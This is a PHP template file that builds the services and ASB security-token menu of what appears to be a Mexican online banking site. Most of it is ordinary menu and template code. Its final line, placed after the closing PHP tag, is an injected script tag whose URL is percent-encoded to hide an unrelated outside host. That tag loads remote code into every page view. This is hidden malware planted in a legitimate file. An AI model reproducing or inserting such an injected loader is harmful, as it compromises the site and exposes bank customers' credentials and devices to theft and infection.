<?php


// Cambio de menu - FAF
	if ( $NuevoMenu == 1 )
	{
		if ( $la_s == "s" )
		{
?>

		<script type="text/javascript">var dmWorkPath="http<?php print $la_s; ?>://<?php print $images_site; ?>/sitedesign/<?php print ($GlobalSiteDesign); ?>/js/menu/deluxe-tree.files/";</script>
		<!-- Deluxe Tree -->
		<noscript>
			<a href="http://deluxe-tree.com [http://deluxe-tree.com]">JavaScript Tree Menu by Deluxe-Tree.com</a>
		</noscript>
	<!--ACS  Inicio Cambio Menu -->
		<!-- <script type="text/JavaScript" language="JavaScript1.2" src="http<?php print $la_s; ?>://<?php print $images_site; ?>/sitedesign/<?php print ($GlobalSiteDesign); ?>/js/menu/deluxe-tree.files/dtree.js"></script>-->
		<script type="text/JavaScript" language="JavaScript1.2" src="http<?php print $la_s; ?>://<?php print ($_SERVER['HTTP_HOST']); ?>/dtree.js"></script>
	<!--ACS  Fin Cambio Menu-->
		<!-- Copyright (c) 2006, Deluxe Tree, deluxe-tree.com [http://deluxe-tree.com] -->

<?php
			echo "<script type=\"text/javascript\">";

			include("menu/deluxe-tree_dcl.js");

			echo "</script>";
		}
	}// Cambio de menu - FAF
	else
	{
// Cambio de menu - FAF
	$t->set_var( "header_menu_bloque", "Servicios" );
	$t->parse( "header", "header_tpl" );

	$t->set_var( "menu_liga", "/userbb/login/logout/" );
	$t->set_var( "menu_nombre_liga", "<font color='#FF0000'><b>S a l i r</b></font>" );
	$t->parse( "row", "row_tpl", true );

	if ( strpos( $priv, "1" ) !== false )
	{
		//ACS  - MenuContenidoAjax I
		//$t->set_var( "menu_liga", "/transaccion/clave/" );
		if ($AjaxActivo===1 && strpos($ModuloAjax,'pwd')===false)
		{
			$t->set_var( "menu_liga", "javascript:iniProcesarMenu('clave', '')" );
		}
		else
		{
			$t->set_var( "menu_liga", "/transaccion/clave/" );
		}
		//ACS  - MenuContenidoAjax F
		$t->set_var( "menu_nombre_liga", "Cambio Clave de Acceso" );
		$t->parse( "row", "row_tpl", true );
	}

	if ( $session->variable( "r_cvop" ) == "Clave ASB (Acceso Seguro Bajio)" )
	{
		$t->set_var( "header_menu_bloque", "ASB" );
		$t->parse( "header", "header_tpl" );

		if ( $session->variable( "r_tkact" ) == "True" )
		{
			//ACS  - MenuContenidoAjax I
			if ($AjaxActivo===1 && strpos($ModuloAjax,'sync')===false)
			{
				$t->set_var( "menu_liga", "javascript:iniProcesarMenu('synchronizeasb', '')" );
			}
			else
			{
				$t->set_var( "menu_liga", "/transaccion/synchronizeasb/" );
			}
			$t->set_var( "menu_nombre_liga", "Sincronizaci&oacute;n Clave ASB" );
			$t->parse( "row", "row_tpl", true );

			if ($AjaxActivo===1 && strpos($ModuloAjax,'pinasb')===false)
			{
				$t->set_var( "menu_liga", "javascript:iniProcesarMenu('pinasb', '')" );
			}
			else
			{
				$t->set_var( "menu_liga", "/transaccion/pinasb/" );
			}

			$t->set_var( "menu_nombre_liga", "Cambio NIP ASB" );
			$t->parse( "row", "row_tpl", true );

			if ($AjaxActivo===1 && strpos($ModuloAjax,'test')===false)
			{
				$t->set_var( "menu_liga", "javascript:iniProcesarMenu('testasb', '')" );
			}
			else
			{
				$t->set_var( "menu_liga", "/transaccion/testasb/" );
			}

			$t->set_var( "menu_nombre_liga", "Prueba Clave ASB" );
			$t->parse( "row", "row_tpl", true );
		}
		else
		{
			// JFL [8-Ene-2012] T-233421 (ini) > Login Amigable Bajionet
			if($friendlyLoginActivo == 0) //Cuando no esta activo el login amigable
			{
				$t->set_var( "menu_liga", "/transaccion/activateasb/" );
				$t->set_var( "menu_nombre_liga", "Activaci&oacute;n Llave ASB" );
				$t->parse( "row", "row_tpl", true );
			}
			// JFL [8-Ene-2012] T-233421 (fin) > Login Amigable Bajionet
		}

    $t->set_var( "menu_liga", "javascript:function PopUp(){window.open( 'http://images.bb.com.mx/ezmediacatalogue/catalogue/GuiaASB.pdf', 'newwindow', 'toolbar = 0, location = 0, directories = 0, status = 0, menubar = 0, scrollbars = 0, resizeable = 0, width = 600, height = 400' );} PopUp();" );
    $t->set_var( "menu_nombre_liga", "Gu&iacute;a de Usuario Llave ASB" );
    $t->parse( "row", "row_tpl", true );

		$t->parse( "menu", "menu_tpl", true );
		$t->set_var( "row", "" );
		$t->set_var( "header_menu_bloque", "" );
	}
// NEX Inicio DatCli
	$t->set_var( "header_menu_bloque", "Informaci&oacute;n del Usuario" );
	$t->parse( "header", "header_tpl" );

	if ( strpos( $priv, "1" ) !== false )
	{
		if ($AjaxActivo===1 && strpos($ModuloAjax,'pwd')===false)
		{
			$t->set_var( "menu_liga", "javascript:iniProcesarMenu('datoscliente', '')" );
		}
		else
		{
			$t->set_var( "menu_liga", "/transaccion/datoscliente/" );
		}
		$t->set_var( "menu_nombre_liga", "Modificar Información" );
		$t->parse( "row", "row_tpl", true );

$dcl = $session->variable( "r_dcl" );
		if ( strlen($dcl) > 2 )
		{
// NEX Inicio DatCli 17Jun2010
//		if ( substr($dcl, 2, 2) == "si" && strpos($dcl,"sn") === false )
		if ( substr($dcl, 2, 2) == "si" && strpos($dcl,"sn") === false && strpos($dcl,"cd") === false)
// NEX Inicio DatCli 17Jun2010		
			{
				if ($AjaxActivo===1 && strpos($ModuloAjax,'pwd')===false)
				{
					$t->set_var( "menu_liga", "javascript:iniProcesarMenu('confdatcli', '')" );
				}
				else
				{
					$t->set_var( "menu_liga", "/transaccion/confdatcli/" );
				}
				$t->set_var( "menu_nombre_liga", "Claves de Validaci&oacute;n" );
				$t->parse( "row", "row_tpl", true );
			}
		}

	}
	$t->parse( "menu", "menu_tpl", true );
	$t->set_var( "row", "" );
	$t->set_var( "header_menu_bloque", "" );
// NEX Fin DatCli


	$t->pparse( "output", "userbox_tpl" );
	}
//}

?>
<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>